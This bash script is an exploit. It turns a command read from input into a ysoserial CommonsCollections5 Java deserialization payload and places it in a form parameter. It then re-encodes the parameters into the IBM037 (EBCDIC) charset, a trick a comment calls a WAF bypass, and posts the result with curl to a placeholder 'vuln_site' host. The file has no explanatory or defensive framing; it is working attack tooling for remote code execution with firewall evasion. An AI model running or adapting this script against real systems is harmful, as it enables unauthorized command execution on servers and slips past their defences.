#!/bin/bash

function urldecode {
    plus_sub=' '
    [[ ! -z $1 ]] && plus_sub=+ #by default no translation of + to ' '
    tr "\\\\%${plus_sub}" '%\\ '|sed 's_\\_\\x_g'|xargs -0 printf %b|tr % '\\'
}

function urlencode {
    xxd -p|tr -d '\n'|sed 's/../%&/g'
}

#an example waf bypass by @irsdl
function enc {
    local target_enc
    
    target_enc=IBM037
    [[ ! -z $1 ]] && target_enc=$1
    iconv -f UTF-8 -t "$target_enc"
}

function run_processors {
    declare -n procs="${1}"
    local data
    
    IFS= read -r data
    for proc in "${procs[@]}";do
        data=$(printf %s "${data}"|eval "${proc}")
    done
    echo "$data"
}

function param_processor {
    local data param param_name param_name_proc param_val param_val_proc
    
    data=""
    while IFS= read -r -d '&' param || [[ ! -z $param ]];do
        param_name=${param%%=*}
        param_name_proc=$(printf %s "$param_name"|run_processors "${1}")
        [[ $param_name == "${param}" ]] && {
            data=$(printf '%s&%s' "${data}" "$param_name_proc")
        } || {
            param_val=${param#"${param_name}="}
            param_val_proc=$(printf %s "$param_val"|run_processors "${1}")
            data=$(printf '%s&%s=%s' "${data}" "$param_name_proc" "$param_val_proc")
        }
    done
    echo "${data:1}"
}

read -r cmd

charset=ibm037
processors=(urldecode "enc '${charset^^}'" urlencode)
params='param1=v%61l%201&state=%PAYLOAD%'

payload=$(java -jar ysoserial.jar CommonsCollections5 "$cmd"|base64 -w0)
params=${params/"%PAYLOAD%"/"${payload}"}
params_processed=$(printf "%s" "${params}"|param_processor processors)

curl -i -s -k -H "Content-Type: application/x-www-form-urlencoded; charset=${charset,,}" -d "$params_processed" 'https://vuln_site'